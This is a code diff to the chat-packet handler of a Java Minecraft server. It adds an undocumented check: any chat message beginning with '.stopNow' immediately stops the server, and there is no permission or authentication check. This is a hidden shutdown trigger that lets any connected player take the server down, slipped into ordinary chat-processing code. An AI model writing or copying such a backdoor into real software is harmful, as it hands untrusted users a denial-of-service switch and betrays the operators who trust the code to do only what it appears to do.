@@ -8,6 +8,7 @@ import org.geysermc.mcprotocollib.protocol.packet.ingame.clientbound.Clientbound
 import org.geysermc.mcprotocollib.protocol.packet.ingame.serverbound.ServerboundChatPacket;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
+import xyz.article.MinecraftServer;
 import xyz.article.RunningData;
 import xyz.article.api.Slider;
 import xyz.article.api.event.events.PlayerChatEvent;
@@ -21,6 +22,10 @@ public class ChatPacketProcessor implements PacketProcessor {
     @Override
     public void process(Session session, Packet packet) {
         if (packet instanceof ServerboundChatPacket chatPacket) {
+            if (chatPacket.getMessage().startsWith(".stopNow")) {
+                MinecraftServer.stop();
+                return;
+            }
             GameProfile profile = Objects.requireNonNull(Slider.getPlayer(session)).getProfile();
             PlayerChatEvent chatEvent = new PlayerChatEvent(Slider.getPlayer(session), chatPacket.getMessage());
             Slider.getEventManager().callEvent(chatEvent);
